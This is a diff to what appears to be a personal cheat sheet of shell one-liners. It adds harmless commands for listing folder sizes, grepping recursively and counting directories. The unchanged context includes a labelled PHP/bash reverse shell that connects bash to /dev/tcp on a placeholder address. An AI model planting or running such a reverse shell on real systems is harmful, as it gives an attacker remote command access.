@@ -11,3 +11,12 @@ ifconfig eth0 | grep "inet:" | cut -d ":" -f2 | cut -d " " -f1
 #php/bash reverse shell
 <?php
 exec("/bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/1234 0>&1'");
+
+# List the size (in human readable form) of all sub folders from the current location
+du -sk -- * | sort -n | perl -pe '@SI=qw(K M G T P); s:^(\d+?)((\d\d\d)*)\s:$1." ".$SI[((length $2)/3)]."\t":e'
+
+# Search for a <pattern> string inside all files in the current directory
+grep -r <pattern> * .[!.]*
+
+# Count total number of subdirectories in current directory starting with specific name.
+find . -type d -name "*TestDir*" | wc -l
